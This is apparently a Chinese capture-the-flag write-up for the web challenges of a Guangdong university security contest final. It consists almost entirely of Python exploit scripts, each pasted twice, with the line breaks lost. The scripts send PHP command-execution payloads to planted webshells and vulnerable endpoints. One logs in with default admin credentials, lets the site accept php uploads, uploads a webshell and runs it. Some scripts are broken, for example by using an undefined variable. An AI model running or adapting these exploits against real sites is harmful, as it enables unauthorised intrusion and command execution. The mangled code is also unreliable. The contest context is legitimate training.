# 第二届广东大学生网络安全攻防大赛决赛WEB WP

> 原文: https://www.ctfiot.com/111689.html
> ID: 111689

│ index.php│├─mc-admin│ conf.php│ editor.php│ foot.php│ head.php│ index.php│ page-edit.php│ page.php│ post-edit.php│ post.php│ style.css│└─mc-files │ markdown.php │ mc-conf.php │ mc-core.php │ mc-rss.php │ mc-tags.php │ ├─pages │ ├─data │ └─index │ delete.php │ draft.php │ publish.php │ ├─posts │ ├─data │ │ tucvj0.dat │ │ │ └─index │ delete.php │ draft.php │ publish.php │ └─theme index.php style.css

import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"data = {"1": "system('cat /flag');"}

def exp_1(): ans = requests.post(url=url, headers=header, data=data) print(ans.text)

exp_1()

import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"
def exp_2(poc="/mc-files/mc-core.php?file=/flag"): ans = requests.post(url=url+poc, headers=header, data=data) print(ans.text)
exp_2()

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass
url = f"http://{HOST}:{PORT}/index/form/index"headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded'}
data = { 'form_id': "system('cat /flag');"}
response = requests.post(url, headers=headers, data=data)print(response.text.split('n')[0])

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass

uri = f"http://{HOST}:{PORT}"def Login():
 url = uri+'/admin/Login/index.html?jstime=1681524228621' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:34001', 'Referer': 'http://127.0.0.1:34001/admin/Login/index.html', 'Connection': 'close', 'Content-Length': '42', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' }
 data = { 'username': 'admin', 'password': '000000', 'verify': 'aaaa' }
 response = requests.post(url, headers=headers, data=data) cookie = response.cookies.get_dict(); return cookie
def move(cookies): url = uri+'/admin/Config/index?jstime=1681524476984' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:34001', 'Referer': 'http://127.0.0.1:34001/admin/Config', 'Connection': 'close', 'Content-Length': '677' }
 data = { 'site_status': '1', 'mobil_status': '2', 'site_title': 'xhcms后台系统', 'site_logo': '/uploads/admin/201910/5db6890644255.jpg', 'keyword': '停车场,高铁,飞机场,测试', 'description': '停车管理系统', 'file_size': '5000', 'cnzz': '', 'sub_title': '武汉网站建设', 'file_type': 'gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5', 'default_themes': 'index', 'off_msg': '站点维护中', 'mobil_domain': '', 'mobil_themes': '' }
 response = requests.post(url, headers=headers, cookies=cookies, data=data)

def upload(cookies): url = uri+'/admin/Upload/uploadImages.html' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Origin': 'http://127.0.0.1:34001', 'Connection': 'close', 'Referer': 'http://127.0.0.1:34001/admin/Config', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' } data={ "id":"WU_FILE_0", "name":"1.jpg", "type":"image/jpeg", "lastModifiedDate":"2023/4/15 09:33:23", "size":"849" } files={'file': ("1.php",open('q.php', 'rb'),"image/jpeg")}

 response = requests.post(url, headers=headers, cookies=cookies, data=data, files=files) j_data = response.json() return j_data["data"]
def gogo(path): url = uri+path
 payload = "cmd=system('cat /flag');" headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:34001", "Connection": "close", "Referer": "http://127.0.0.1:34001/mc-admin/page-edit.php", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1" }
 response = requests.request("POST", url, headers=headers, data=payload)
 print(response.text)
try: c = Login() move(c) p = upload(c) gogo(p)except: pass

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass
url = f"http://{HOST}:{PORT}/uploads/admin/201910/this_is_big.php"payload = {'x': 'cat /flag'}headers = {'Content-Type': 'application/x-www-form-urlencoded'}response = requests.post(url, headers=headers, data=payload)print(response.text)

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass
uri = f"http://{HOST}:{PORT}"def get1(): url = uri+'/index/index/shell' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' } try: response = requests.get(url,headers=headers,timeout=1) except: pass
def gogo(): url = uri+'/uploads/.bk.php' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' }
 data = { 'cmd': "system('cat /flag');" }
 response = requests.post(url, headers=headers, data=data)
 print(response.text)
get1()gogo()


```
│ index.php│├─mc-admin│ conf.php│ editor.php│ foot.php│ head.php│ index.php│ page-edit.php│ page.php│ post-edit.php│ post.php│ style.css│└─mc-files │ markdown.php │ mc-conf.php │ mc-core.php │ mc-rss.php │ mc-tags.php │ ├─pages │ ├─data │ └─index │ delete.php │ draft.php │ publish.php │ ├─posts │ ├─data │ │ tucvj0.dat │ │ │ └─index │ delete.php │ draft.php │ publish.php │ └─theme index.php style.css
```



```
import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"data = {"1": "system('cat /flag');"}

def exp_1(): ans = requests.post(url=url, headers=header, data=data) print(ans.text)

exp_1()
```



```
import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"
def exp_2(poc="/mc-files/mc-core.php?file=/flag"): ans = requests.post(url=url+poc, headers=header, data=data) print(ans.text)
exp_2()
```



```
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass
url = f"http://{HOST}:{PORT}/index/form/index"headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded'}
data = { 'form_id': "system('cat /flag');"}
response = requests.post(url, headers=headers, data=data)print(response.text.split('n')[0])
```



```
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass

uri = f"http://{HOST}:{PORT}"def Login():
 url = uri+'/admin/Login/index.html?jstime=1681524228621' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:34001', 'Referer': 'http://127.0.0.1:34001/admin/Login/index.html', 'Connection': 'close', 'Content-Length': '42', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' }
 data = { 'username': 'admin', 'password': '000000', 'verify': 'aaaa' }
 response = requests.post(url, headers=headers, data=data) cookie = response.cookies.get_dict(); return cookie
def move(cookies): url = uri+'/admin/Config/index?jstime=1681524476984' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:34001', 'Referer': 'http://127.0.0.1:34001/admin/Config', 'Connection': 'close', 'Content-Length': '677' }
 data = { 'site_status': '1', 'mobil_status': '2', 'site_title': 'xhcms后台系统', 'site_logo': '/uploads/admin/201910/5db6890644255.jpg', 'keyword': '停车场,高铁,飞机场,测试', 'description': '停车管理系统', 'file_size': '5000', 'cnzz': '', 'sub_title': '武汉网站建设', 'file_type': 'gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5', 'default_themes': 'index', 'off_msg': '站点维护中', 'mobil_domain': '', 'mobil_themes': '' }
 response = requests.post(url, headers=headers, cookies=cookies, data=data)

def upload(cookies): url = uri+'/admin/Upload/uploadImages.html' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Origin': 'http://127.0.0.1:34001', 'Connection': 'close', 'Referer': 'http://127.0.0.1:34001/admin/Config', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' } data={ "id":"WU_FILE_0", "name":"1.jpg", "type":"image/jpeg", "lastModifiedDate":"2023/4/15 09:33:23", "size":"849" } files={'file': ("1.php",open('q.php', 'rb'),"image/jpeg")}

 response = requests.post(url, headers=headers, cookies=cookies, data=data, files=files) j_data = response.json() return j_data["data"]
def gogo(path): url = uri+path
 payload = "cmd=system('cat /flag');" headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:34001", "Connection": "close", "Referer": "http://127.0.0.1:34001/mc-admin/page-edit.php", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1" }
 response = requests.request("POST", url, headers=headers, data=payload)
 print(response.text)
try: c = Login() move(c) p = upload(c) gogo(p)except: pass
```



```
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass
url = f"http://{HOST}:{PORT}/uploads/admin/201910/this_is_big.php"payload = {'x': 'cat /flag'}headers = {'Content-Type': 'application/x-www-form-urlencoded'}response = requests.post(url, headers=headers, data=payload)print(response.text)
```



```
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]except: pass
uri = f"http://{HOST}:{PORT}"def get1(): url = uri+'/index/index/shell' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' } try: response = requests.get(url,headers=headers,timeout=1) except: pass
def gogo(): url = uri+'/uploads/.bk.php' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' }
 data = { 'cmd': "system('cat /flag');" }
 response = requests.post(url, headers=headers, data=data)
 print(response.text)
get1()gogo()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1682215529.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/1-1682215530.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682215530.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682215531.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/4-1682215532.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682215532.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682215532.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1682215533.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1682215534.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/1-1682215534.jpeg)